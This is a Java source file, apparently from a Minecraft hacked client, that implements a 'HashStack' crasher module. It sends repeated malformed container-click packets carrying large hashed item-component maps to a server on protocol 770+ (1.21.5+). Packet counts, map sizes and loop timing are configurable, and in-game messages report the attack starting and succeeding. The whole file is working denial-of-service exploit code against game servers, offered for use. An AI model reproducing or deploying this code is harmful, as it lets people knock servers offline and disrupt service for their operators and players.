package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.objects.HashStack;
import me.dannycrasher.client.protocol.packets.PacketCodec;
import me.dannycrasher.client.protocol.packets.play.PacketContainerClick;
import net.minecraft.client.Minecraft;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class HashStackCrash extends Module {
	public HashStackCrash() {
		super("HashStack", "Hashed container-click slot map bomb (1.21.5+ / protocol 770+)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "100");
		addArgument("mapSize", ArgumentType.INT, 1, 512, "128");
		addArgument("compSize", ArgumentType.INT, 1, 4096, "256");
		addArgument("delCompSize", ArgumentType.INT, 1, 4096, "256");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
		addArgument("loopAmount", ArgumentType.INT, 1, 30, "15");
	}

	private ScheduledExecutorService executorService;

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int mapSize = context.getInt("mapSize");
		int compSize = context.getInt("compSize");
		int delCompSize = context.getInt("delCompSize");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		setEnabled(true);

		if (executorService != null && !executorService.isShutdown()) {
			executorService.shutdownNow();
			context.sendMessage("Previous attack <red>stopped<white>!");
		}

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		if (Protocol.HASHED_ITEM_PROTOCOLS.contains(protocol)) {
			HashStack hashStack = new HashStack(compSize, delCompSize);

			context.sendMessage("Start crashing with method: <aqua>" + getName() + "<white>!");

			AtomicInteger check = new AtomicInteger(0);
			executorService = Executors.newSingleThreadScheduledExecutor();
			Runnable clickTask = () -> {
				if (!isEnabled() || !Protocol.isSendingEnabled() || check.get() == loopAmount
						|| (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
					executorService.shutdown();
					setEnabled(false);
					if (Minecraft.getInstance().getConnection() != null) {
						context.sendMessage("Attack <green>successful <white>finished!");
					}
				} else {
					PacketCodec.sendPacket(new PacketContainerClick(
									ViaFabricPlus.getImpl().getTargetVersion().getVersion(),
									0,
									1,
									10,
									PacketContainerClick.ContainerActionType.CLICK_ITEM,
									PacketContainerClick.ContainerAction.RIGHT_CLICK,
									hashStack,
									mapSize),
							packets);
				}

				check.getAndIncrement();
			};
			executorService.scheduleAtFixedRate(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
		} else {
			context.sendMessage("<red>HashStack requires protocol 770+ (1.21.5). Current protocol: <aqua>" + protocol);
		}
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		if (executorService != null) {
			executorService.shutdownNow();
		}
	}
}
